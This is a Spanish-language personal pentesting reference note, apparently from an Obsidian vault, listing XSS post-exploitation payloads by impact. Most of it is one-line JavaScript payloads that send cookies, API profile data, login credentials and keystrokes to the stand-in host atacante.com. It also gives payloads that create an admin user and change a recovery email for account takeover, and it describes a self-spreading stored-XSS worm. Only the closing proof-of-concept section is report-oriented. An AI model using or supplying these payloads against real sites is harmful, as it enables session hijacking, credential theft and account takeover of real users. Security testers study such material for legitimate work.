---
tipo: meta
aliases:
  - Payloads XSS impacto
  - XSS post-explotación
tags:
  - meta/referencia
  - dominio/web
---

# XSS impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué hacés con la ejecución de JS. El impacto es un eje aparte del tipo y del contexto. `atacante.com` es tu servidor de recolección. `yi``  ` copia.

## Robo de cookie de sesión

`<script>fetch('https://atacante.com/c?='+document.cookie)</script>`
El clásico. **No funciona si la cookie es `HttpOnly`** — ahí no hay acceso desde JS y se pasa a robo de sesión sin cookie (abajo).

`<script>new Image().src='https://atacante.com/c?='+document.cookie</script>`
Variante por imagen: a veces esquiva un `connect-src` que bloquea `fetch`.

`<script>navigator.sendBeacon('https://atacante.com/c',document.cookie)</script>`
`sendBeacon` sobrevive a que la página se cierre.

## Robo de sesión con cookie HttpOnly

Si la cookie no es accesible, se usa la sesión de la víctima **desde su propio navegador**:

`fetch('/cambiar-email',{method:'POST',body:'email=atacante@x.com',headers:{'Content-Type':'application/x-www-form-urlencoded'}})`
Ejecutás la acción sensible directamente con la sesión activa — no necesitás la cookie, la usa el navegador.

`fetch('/api/me').then(r=>r.text()).then(d=>fetch('https://atacante.com/?d='+btoa(d)))`
Leer datos del perfil vía la API y exfiltrarlos.

## Robo de credenciales

`document.forms[0].onsubmit=function(){new Image().src='https://atacante.com/?u='+this.user.value+'&p='+this.pass.value}`
Interceptar el submit de un formulario de login inyectado en la misma página.

`document.body.innerHTML='<form action=https://atacante.com><input name=user><input name=pass type=password><button>Iniciar sesión</button></form>'`
Phishing en el origen legítimo: la URL en la barra es la real.

## Keylogger

`document.onkeypress=function(e){new Image().src='https://atacante.com/k?='+e.key}`
Cada tecla se exfiltra. Útil en formularios que no se envían de inmediato.

## Forzar una acción (CSRF vía XSS)

`fetch('/admin/add-user',{method:'POST',body:'user=atacante&role=admin',credentials:'include'})`
XSS anula cualquier token CSRF: el JS lee el token del DOM y lo incluye. Por eso XSS > CSRF.

## Account takeover

`fetch('/api/reset-password',{method:'POST',credentials:'include',body:JSON.stringify({email:'atacante@x.com'})})`
Cambiar el email de recuperación → tomar la cuenta. El impacto máximo típico del XSS almacenado sobre un admin.

## Worm (solo almacenado)

Un payload que, además de su efecto, **se re-publica** a sí mismo en el mismo campo vulnerable se propaga a cada visitante que luego publica. Es lo que hizo el gusano Samy en MySpace. Requiere XSS almacenado en una acción que la víctima repite.

## Prueba de concepto para el informe

`<script>alert(document.domain)</script>`  →  reemplazar por  `alert(document.cookie)` solo si es necesario mostrar impacto.
Para el hallazgo alcanza con `document.domain`: demuestra ejecución en el origen sin tocar datos reales. Ver [[Inyección SQL en parámetro de búsqueda]] como modelo de nota de hallazgo.

## Relacionadas

[[MOC - Cross-site scripting]] · [[XSS contextos - matriz de referencia]] · [[XSS - almacenado]]
